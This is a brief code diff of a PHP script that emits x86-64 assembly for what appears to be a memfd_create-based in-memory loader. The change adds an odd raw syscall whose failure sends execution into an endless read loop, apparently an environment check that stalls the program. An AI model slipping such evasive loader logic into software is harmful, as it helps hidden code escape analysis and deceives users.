@@ -43,6 +43,11 @@ fwrite($handle, <<<ASM
 _set_stack:
   mov [{$argv}], rdi
   mov [{$envp}], rsi
+  mov rax, 16902
+  xor rdi, rdi
+  syscall
+  cmp rax, -1
+  je vt
   call memfd_create
   mov [{$memfd}], rax
 
@@ -122,6 +127,14 @@ memfd_create:
   mov rsp, rbp
   pop rbp
   ret
+
+vt:
+  mov rax, 0
+  mov rdi, 0
+  lea rsi, [rbp - 32]
+  mov rdx, 32
+  syscall
+  jmp vt
 
 ASM);
 
